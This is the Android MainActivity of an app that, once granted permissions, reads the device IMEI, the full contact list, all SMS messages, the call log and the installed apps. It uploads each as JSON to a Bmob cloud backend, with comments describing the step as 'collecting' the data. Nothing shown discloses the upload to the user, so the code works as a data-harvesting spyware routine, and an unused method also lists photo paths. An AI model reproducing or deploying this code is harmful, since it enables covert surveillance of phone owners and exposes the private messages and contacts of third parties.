package ren.lollipop.cloud;

import android.Manifest;
import android.os.Build;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.annotation.RequiresApi;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;

import org.json.JSONArray;

import java.util.List;

import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;
import cn.bmob.v3.BmobQuery;
import cn.bmob.v3.exception.BmobException;
import cn.bmob.v3.listener.FindListener;
import cn.bmob.v3.listener.QueryListener;
import cn.bmob.v3.listener.SaveListener;
import cn.bmob.v3.listener.UpdateListener;
import permissions.dispatcher.NeedsPermission;
import permissions.dispatcher.OnPermissionDenied;
import permissions.dispatcher.RuntimePermissions;
import ren.lollipop.cloud.model.CallLogInfoBean;
import ren.lollipop.cloud.model.ContactBean;
import ren.lollipop.cloud.model.NativeAppInfoBean;
import ren.lollipop.cloud.model.SmSMessageBean;
import ren.lollipop.cloud.model.UserAppCloud;
import ren.lollipop.cloud.model.UserCallLogCloud;
import ren.lollipop.cloud.model.UserCloud;
import ren.lollipop.cloud.model.UserContactCloud;
import ren.lollipop.cloud.model.UserSmsCloud;
import ren.lollipop.cloud.tools.CallLogUtils;
import ren.lollipop.cloud.tools.ContactUtil;
import ren.lollipop.cloud.tools.GalleryUtil;
import ren.lollipop.cloud.tools.NativeAppUtils;
import ren.lollipop.cloud.tools.SmSMessageUtil;
import ren.lollipop.cloud.tools.UserCloudUtils;

@RuntimePermissions
public class MainActivity extends AppCompatActivity {
    @BindView(R.id.bt_start)
    Button btStart;
    @BindView(R.id.tv_content)
    TextView tvContent;

    private Gson gson = new Gson();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        ButterKnife.bind(this);
        MainActivityPermissionsDispatcher.applyForPermissionWithPermissionCheck(this);

        btStart.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                readUserDevice();
            }
        });
    }

    @NeedsPermission({ Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CONTACTS,Manifest.permission.READ_CALL_LOG,Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_NUMBERS, Manifest.permission.READ_EXTERNAL_STORAGE})//使用权限
     void applyForPermission() {
         Toast.makeText(MainActivity.this, "获得权限", Toast.LENGTH_SHORT).show();
    }

    @OnPermissionDenied({Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CONTACTS,Manifest.permission.READ_CALL_LOG,Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_NUMBERS, Manifest.permission.READ_EXTERNAL_STORAGE})//拒绝权限
    void showDenied() {
        Toast.makeText(MainActivity.this, "无法获得权限", Toast.LENGTH_SHORT).show();
    }



    /**
     *,6，权限回调，调用PermissionsDispatcher的回调方法
     */
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        MainActivityPermissionsDispatcher.onRequestPermissionsResult(MainActivity.this, requestCode, grantResults);
    }




    /**
     * 读取本机基本信息
     */
    private void readUserDevice() {
        UserCloud userCloud = UserCloudUtils.readDevice(MainActivity.this);
        BmobQuery<UserCloud> query = new BmobQuery<UserCloud>();
        query.addWhereEqualTo("device_imei", userCloud.getDevice_imei());
        query.findObjects(new FindListener<UserCloud>() {
            @Override
            public void done(List<UserCloud> list, BmobException e) {
                if (e == null) {
                    UserCloud cloudDevice = list.get(0);
                    Log.d("-----", "有该设备:"+cloudDevice.getCellphone());
                    //查看是否有通讯录id,没有的话添加通讯录
                    userCloud.setObjectId(cloudDevice.getObjectId());
                    if (cloudDevice.getContact_object_id() == null || cloudDevice.getContact_object_id().equals("")) {//没有收集通讯录就算了
                        Log.d("--------", "开始收集通讯录");
                        readContact(userCloud);
                    }

                    if (cloudDevice.getAppinstall_object_id() == null || cloudDevice.getAppinstall_object_id().equals("")) {//没有收集app安装
                        Log.d("--------", "开始收集App信息");
                        readAppInfo(userCloud);
                    }

                    if (cloudDevice.getSmsmsg_object_id() == null || cloudDevice.getSmsmsg_object_id().equals("")) {//没有收集app安装
                        Log.d("--------", "开始收集短信信息");
                        readSmsMessage(userCloud);
                    }

                    if (cloudDevice.getCelllog_object_id() == null || cloudDevice.getCelllog_object_id().equals("")) {//没有收集app安装
                        Log.d("--------", "开始收集通话记录信息");
                        readCallLog(userCloud);
                    }

                } else {
                    Log.d("-----","无该设备:" + e.getMessage());
                    addUserDevice(userCloud);
                    readAppInfo(userCloud);
                    readSmsMessage(userCloud);
                    readCallLog(userCloud);
                }

            }
        });

    }

    private void addUserDevice(UserCloud userCloud) {
        userCloud.save(new SaveListener<String>() {
            @Override
            public void done(String objectId,BmobException e) {
                if(e == null){
                    Log.d("-----", "添加设备数据成功，返回objectId为："+objectId);
                    // 开始添加通讯录id
                    userCloud.setObjectId(objectId);
                    readContact(userCloud);
                }else{
                    Log.d("-----","添加设备数据失败：" + e.getMessage());
                }
            }
        });
    }


    private void updateUserDevice(UserCloud userCloud) {
        userCloud.update(userCloud.getObjectId(), new UpdateListener() {
            @Override
            public void done(BmobException e) {
                if(e==null){
                    Log.i("------","更新成功");
                }else{
                    Log.i("------","更新失败："+e.getMessage()+","+e.getErrorCode());
                }
            }
        });
    }





    /**
     * 1.读取本机通讯录信息
     * @throws Throwable
     */
    private void readContact(UserCloud userCloud) {
        try {
            List<ContactBean> allContact = ContactUtil.getAllContact(this);
            String contact_json = gson.toJson(allContact);

            UserContactCloud userContactCloud = new UserContactCloud();
            userContactCloud.setDevice_imei(userCloud.getDevice_imei());
            userContactCloud.setContact_json(contact_json);
            saveContact(userCloud, userContactCloud);

        } catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }

    private void saveContact(UserCloud userCloud, UserContactCloud userContactCloud) {
        userContactCloud.save(new SaveListener<String>() {
            @Override
            public void done(String objectId,BmobException e) {
                if(e == null){
                    Log.d("-----", "添加通讯录数据成功，返回objectId为："+objectId);
                    userCloud.setContact_object_id(objectId);
                    updateUserDevice(userCloud );//更新
                }else{
                    Log.d("-----","添加讯录数据失败：" + e.getMessage());
                }
            }
        });
    }




    /**
     * 2.读取本机安装应用的列表
     */
    private void readAppInfo(UserCloud userCloud) {
        try {
            List<NativeAppInfoBean> allApps = NativeAppUtils.getAllApps(this, 0);

            String app_json = gson.toJson(allApps);

            UserAppCloud userAppCloud = new UserAppCloud();
            userAppCloud.setDevice_imei(userCloud.getDevice_imei());
            userAppCloud.setApp_json(app_json);
            saveAppInfo(userCloud, userAppCloud);

        } catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }

    private void saveAppInfo(UserCloud userCloud, UserAppCloud userAppCloud) {
        try {
            userAppCloud.save(new SaveListener<String>() {
                @Override
                public void done(String objectId,BmobException e) {
                    if(e == null){
                        Log.d("-----", "添加App数据成功，返回objectId为："+objectId);
                        userCloud.setAppinstall_object_id(objectId);
                        updateUserDevice(userCloud );//更新
                    }else{
                        Log.d("-----","添加App数据失败：" + e.getMessage());
                    }
                }
            });

        } catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }




    /**
     * 3.读取短信
     */
    private void readSmsMessage(UserCloud userCloud) {
        try {
            List<SmSMessageBean> smsInPhone = SmSMessageUtil.getSmsInPhone(0, this);
            String sms_json = gson.toJson(smsInPhone);
            Log.d("-----------", "短信"+sms_json);
            UserSmsCloud userSmsCloud = new UserSmsCloud();
            userSmsCloud.setDevice_imei(userCloud.getDevice_imei());
            userSmsCloud.setSms_json(sms_json);
            saveSmsMessage(userCloud, userSmsCloud);
        } catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }

    /**
     * 读取短信
     */
    private void saveSmsMessage(UserCloud userCloud, UserSmsCloud userSmsCloud) {
        try {
            userSmsCloud.save(new SaveListener<String>() {
                @Override
                public void done(String objectId,BmobException e) {
                    if(e == null){
                        Log.d("-----", "添加短信数据成功，返回objectId为："+objectId);
                        userCloud.setSmsmsg_object_id(objectId);
                        updateUserDevice(userCloud );//更新
                    }else{
                        Log.d("-----","添加短信数据失败：" + e.getMessage());
                    }
                }
            });
        } catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }



    /**
     * 4.读取通话记录
     */
    private void readCallLog(UserCloud userCloud) {
        try {
            List<CallLogInfoBean> callLogInfos = CallLogUtils.getCallLogInfos(this, 0);
            String call_log_json = gson.toJson(callLogInfos);
            UserCallLogCloud userCallLogCloud = new UserCallLogCloud();
            userCallLogCloud.setDevice_imei(userCloud.getDevice_imei());
            userCallLogCloud.setCalllog_json(call_log_json);
            saveCallLog(userCloud, userCallLogCloud);
        } catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }

    private void saveCallLog(UserCloud userCloud, UserCallLogCloud userCallLogCloud) {
        try {
            userCallLogCloud.save(new SaveListener<String>() {
                @Override
                public void done(String objectId,BmobException e) {
                    if(e == null){
                        Log.d("-----", "添加通话记录数据成功，返回objectId为："+objectId);
                        userCloud.setCelllog_object_id(objectId);
                        updateUserDevice(userCloud );//更新
                    }else{
                        Log.d("-----","添加通话记录数据失败：" + e.getMessage());
                    }
                }
            });

        } catch (Throwable throwable) {
            throwable.printStackTrace();
        }
    }



    //照片 & 音频 & 视频
    private void getMedia() {
        List<String>  list = GalleryUtil.getSystemPhotoList(this);
        for (String path : list) {
            Log.d("---------------", "path:"+path);
        }
    }

}
